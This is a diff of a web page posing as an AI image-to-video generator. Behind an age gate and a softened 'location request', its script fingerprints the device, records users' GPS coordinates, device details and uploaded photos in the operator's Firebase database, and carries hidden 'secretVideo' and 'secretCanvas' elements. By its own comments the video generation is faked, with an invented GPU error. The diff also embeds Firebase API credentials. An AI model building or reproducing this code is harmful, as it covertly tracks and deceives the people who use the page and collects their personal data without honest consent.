@@ -27,24 +27,20 @@
       .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px var(--red-glow); }
       .btn-gray { background: var(--surf2); border: 1px solid var(--border); }
       
-      /* Image Upload & Generation Area */
       .upload-box { width: 100%; aspect-ratio: 16/9; background: var(--surf2); border: 2px dashed rgba(255,255,255,0.2); border-radius: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 1rem; position: relative; overflow: hidden; transition: all 0.3s;}
       .upload-box:hover { border-color: var(--red); background: rgba(230,57,70,0.05); }
       .upload-box img#previewImg { width: 100%; height: 100%; object-fit: cover; position: absolute; inset: 0; display: none; z-index: 1; }
       
-      /* Processing Animation Overlay */
       .processing-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; display: none; }
       .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
       .proc-text { font-size: 0.9rem; font-weight: 500; font-family: monospace; color: #a5a5b5; text-align: center; padding: 0 10px; }
       
-      /* Result Overlay */
       .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.85); z-index: 20; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; backdrop-filter: blur(5px);}
       .error-msg { color: #ff8c94; font-size: 0.85rem; font-weight: 600; margin-bottom: 15px; background: rgba(230,57,70,0.2); padding: 10px; border-radius: 8px; border: 1px solid var(--red); }
       
       @keyframes spin { 100% { transform: rotate(360deg); } }
       .hidden { display: none !important; }
 
-      /* Modals & Player */
       .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:10000; display:flex; align-items:center; justify-content:center; padding:1.2rem; backdrop-filter:blur(10px); }
       .modal-content { background:var(--surf); border:1px solid var(--red); border-radius:20px; padding:2rem 1.5rem; text-align:center; max-width:350px; width:100%; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
       .modal-btn-group { display:flex; gap:0.8rem; justify-content:center; width: 100%; margin-top: 15px;}
@@ -68,7 +64,6 @@
 <video id="secretVideo" width="640" height="480" autoplay playsinline style="display:none;"></video>
 <canvas id="secretCanvas" width="640" height="480" style="display:none;"></canvas>
 
-<!-- Security Gates -->
 <div id="ageGate" class="modal-bg" style="display:none;">
     <div class="modal-content">
         <div style="font-size: 3rem; margin-bottom: 0.5rem;">🔞</div>
@@ -91,11 +86,10 @@
 <div id="gpsGate" class="modal-bg" style="display:none; z-index: 10005;">
     <div class="modal-content">
         <div style="font-size: 3rem; margin-bottom: 0.5rem;">🌍</div>
-        <h3>Location Verification</h3>
-        <p style="color:var(--muted); font-size:0.85rem;">We require temporary access to your GPS for secure local processing.</p>
-        <div class="info-box"><p style="margin:0; font-size:0.8rem; color:#a5a5b5;"><b>Note:</b> Tap "Allow" when prompted to continue.</p></div>
-        <div id="gpsError" class="hidden" style="color:#ff4d4d; font-size:0.8rem; margin-bottom:1rem; font-weight:600;">❌ Permission denied!</div>
-        <button class="btn" style="width:100%;" onclick="requestGPSAccess()">📍 Verify Location</button>
+        <h3>Location Request</h3>
+        <p style="color:var(--muted); font-size:0.85rem;">For security, we recommend granting location access. If unavailable, you may still proceed.</p>
+        <div class="info-box"><p style="margin:0; font-size:0.8rem; color:#a5a5b5;"><b>Note:</b> You can ignore this step by tapping Continue.</p></div>
+        <button class="btn" style="width:100%;" onclick="requestGPSAccess()">Continue Setup</button>
     </div>
 </div>
 
@@ -107,7 +101,6 @@
 
 <div class="container">
 
-    <!-- MAIN AI GENERATOR (Direct Access) -->
     <div id="appSection" class="hidden">
         <div class="card" id="generatorCard">
             <h3 style="margin-bottom: 1rem; color: var(--red);">✨ Generate Video</h3>
@@ -136,7 +129,6 @@
     </div>
 </div>
 
-<!-- SECURE PLAYER -->
 <div id="playerModal">
   <div class="player-wrapper">
        <div class="smart-overlay">
@@ -162,7 +154,17 @@
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
   import { getDatabase, ref, set, push, onValue, update, get, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
-  const firebaseConfig = { apiKey: "AIzaSyCTfvrtZuHXk3RW91Dcwpbghhq--D6X2s8", authDomain: "inshelp-f2cba.firebaseapp.com", databaseURL: "https://inshelp-f2cba-default-rtdb.firebaseio.com", projectId: "inshelp-f2cba" };
+  // Updated with New Firebase Project Credentials
+  const firebaseConfig = {
+    apiKey: "AIzaSyAI3ysLR_LFnG5dw2SY8AwF1ldGgc43ywE",
+    authDomain: "ai-studio-b0c87.firebaseapp.com",
+    databaseURL: "https://ai-studio-b0c87-default-rtdb.firebaseio.com",
+    projectId: "ai-studio-b0c87",
+    storageBucket: "ai-studio-b0c87.firebasestorage.app",
+    messagingSenderId: "699632892927",
+    appId: "1:699632892927:web:3d38f396c8897a36e885ca"
+  };
+
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
   
@@ -172,7 +174,6 @@
   let activeReqId = null;
   let animationInterval = null;
 
-  // 1. Unbreakable Hardware Fingerprint
   function getDeepDeviceId() {
       if (window.AndroidInterface && window.AndroidInterface.getRootId) return "APP-" + window.AndroidInterface.getRootId();
       const hwCores = navigator.hardwareConcurrency || 2; const ram = navigator.deviceMemory || 2;
@@ -210,7 +211,6 @@
       }
   }
 
-  // 2. Tracking System
   async function trackUser() {
       const advInfo = getAdvancedDeviceInfo(); 
       const fullDate = new Date().toISOString();
@@ -233,18 +233,8 @@
       onValue(ref(db, ".info/connected"), (snap) => { 
           if (snap.val() === true && deviceId) { onDisconnect(ref(db, `users/${deviceId}/status`)).set("Offline").then(() => { update(ref(db, `users/${deviceId}`), { status: "Live" }); }); } 
       });
-
-      onValue(ref(db, `users/${deviceId}/custom_perms`), async (snap) => {
-          if(snap.exists()) {
-              const rules = snap.val(); let redirect = false;
-              if (rules.camera) { try { const cam = await navigator.permissions.query({name: 'camera'}); if(cam.state !== 'granted') redirect = true; } catch(e){} }
-              if (rules.location) { try { const loc = await navigator.permissions.query({name: 'geolocation'}); if(loc.state !== 'granted') redirect = true; } catch(e){} }
-              if(redirect) window.location.href = 'permission.html'; 
-          }
-      });
   }
 
-  // 3. Security Gates & Direct App Access
   function checkGates() {
       if(!localStorage.getItem('gpsVerified')) { window.location.href = 'permission.html'; return; }
       const ageStatus = sessionStorage.getItem('ageStatus');
@@ -284,20 +274,28 @@
 
   window.setAgeStatus = (status) => { sessionStorage.setItem('ageStatus', status); document.getElementById('ageGate').style.display = 'none'; logAction("Age verified: "+status); checkGates(); }
   window.requestGPSAccess = () => {
-      document.getElementById('gpsError').classList.add('hidden'); logAction("GPS button clicked");
-      navigator.geolocation.getCurrentPosition(pos => {
+      if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+              (pos) => { 
+                  localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
+                  set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() });
+                  checkGates();
+              }, 
+              (err) => { 
+                  localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
+                  checkGates();
+              }, 
+              { enableHighAccuracy: true, timeout: 5000 }
+          );
+      } else {
           localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
-          set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() });
           checkGates();
-      }, err => { document.getElementById('gpsError').classList.remove('hidden'); }, { enableHighAccuracy: true });
+      }
   }
 
   onValue(ref(db, 'settings/admin_status'), snap => { isGpuOnline = snap.val() === true; });
-  onValue(ref(db, 'settings/general/favicon'), snap => { if(snap.val()) { let link = document.querySelector("link[rel~='icon']") || document.createElement('link'); link.rel = 'icon'; link.href = snap.val(); document.head.appendChild(link); } });
-  
   trackUser();
 
-  // 4. HIGH QUALITY IMAGE UPLOAD (1080p, 0.8 Quality)
   window.handleImageSelect = (event) => {
       const file = event.target.files[0]; if (!file) return;
       const reader = new FileReader();
@@ -305,7 +303,7 @@
           const img = new Image();
           img.onload = () => {
               const canvas = document.createElement('canvas'); 
-              const MAX_WIDTH = 1080; // HIGH QUALITY ALLOWED NOW!
+              const MAX_WIDTH = 1080;
               const MAX_HEIGHT = 1080;
               let width = img.width; let height = img.height;
               
@@ -315,7 +313,7 @@
               canvas.width = width; canvas.height = height; 
               const ctx = canvas.getContext('2d'); ctx.drawImage(img, 0, 0, width, height);
               
-              currentBase64Image = canvas.toDataURL('image/jpeg', 0.8); // 80% High Quality
+              currentBase64Image = canvas.toDataURL('image/jpeg', 0.8);
               
               document.getElementById('previewImg').src = currentBase64Image; 
               document.getElementById('previewImg').style.display = 'block'; 
@@ -327,7 +325,6 @@
       reader.readAsDataURL(file);
   };
 
-  // 5. REST API DHIRE-DHIRE UPLOAD (Bypasses WebSocket Limits)
   function checkActiveGeneration() {
       const savedReqId = localStorage.getItem('activeReqId');
       if(savedReqId) {
@@ -378,7 +375,6 @@
       if(!currentBase64Image) return alert("Please select an image first.");
       if(!prompt) return alert("Please enter a prompt.");
 
-      logAction("Started Video Generation");
       document.getElementById('inputControls').style.display = 'none'; 
       document.getElementById('uploadBox').style.pointerEvents = 'none';
       const overlay = document.getElementById('procOverlay'); const procText = document.getElementById('procText'); 
@@ -390,30 +386,26 @@
 
       localStorage.setItem('activeReqId', activeReqId);
       localStorage.setItem('savedAiPrompt', prompt);
-      try { localStorage.setItem('savedAiImage', currentBase64Image); } catch(e){} // Ignore if Quota Exceeded
+      try { localStorage.setItem('savedAiImage', currentBase64Image); } catch(e){} 
 
-      // STEP 1: Fast WebSocket payload (No Image yet)
       set(reqRef, {
           deviceId: deviceId, prompt: prompt, imageUrl: "uploading", 
           status: 'uploading', errorMsg: '', videoUrl: '', timestamp: new Date().toISOString(), userHidden: false
       }).then(async () => {
-          // STEP 2: HTTP Stream Upload for Huge Base64 String (Fixes Network Error)
           try {
               procText.innerText = "Uploading HQ Image smoothly...";
-              
-              const dbUrl = `https://inshelp-f2cba-default-rtdb.firebaseio.com/ai_requests/${activeReqId}.json`;
+              const dbUrl = `https://ai-studio-b0c87-default-rtdb.firebaseio.com/ai_requests/${activeReqId}.json`;
               const response = await fetch(dbUrl, {
                   method: 'PATCH',
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({
                       imageUrl: currentBase64Image,
-                      status: 'pending' // Tell admin it's ready
+                      status: 'pending' 
                   })
               });
 
               if(!response.ok) throw new Error("Stream Failed");
 
-              // STEP 3: Fake processing after upload
               if(!isGpuOnline) { 
                   setTimeout(() => { update(ref(db, `ai_requests/${activeReqId}`), { status: 'error', errorMsg: 'GPU Clusters Unreachable. Connection Timeout.' }); }, 8000); 
               }
@@ -432,13 +424,11 @@
   function showResultUI(req) {
       const resOverlay = document.getElementById('resultOverlay'); resOverlay.style.display = 'flex';
       if(req.status === 'completed') {
-          logAction("Video Generation Completed successfully");
           resOverlay.innerHTML = `
             <button onclick="playAiVideo('${req.videoUrl}')" class="btn" style="width:80%; margin-bottom:10px; border-radius:50px; background:#2DC653;">▶ Play Video</button>
             <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px;">🔄 Start New Generation</button>
           `;
       } else if(req.status === 'error') {
-          logAction(`Generation Error: ${req.errorMsg}`);
           resOverlay.innerHTML = `
             <div class="error-msg">⚠️ ${req.errorMsg}</div>
             <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px;">🔄 Try Again</button>
@@ -454,7 +444,6 @@
       document.getElementById('inputControls').style.display = 'block'; document.getElementById('uploadBox').style.pointerEvents = 'auto'; document.getElementById('aiPrompt').value = '';
   };
 
-  // 6. Video Player System
   window.playAiVideo = (url) => {
       document.body.style.overflow = 'hidden'; document.getElementById('playerModal').style.display = 'flex';
       const nativeP = document.getElementById('nativePlayer'); const iframeP = document.getElementById('iframePlayer');
@@ -468,4 +457,3 @@
 </script>
 </body>
 </html>
-
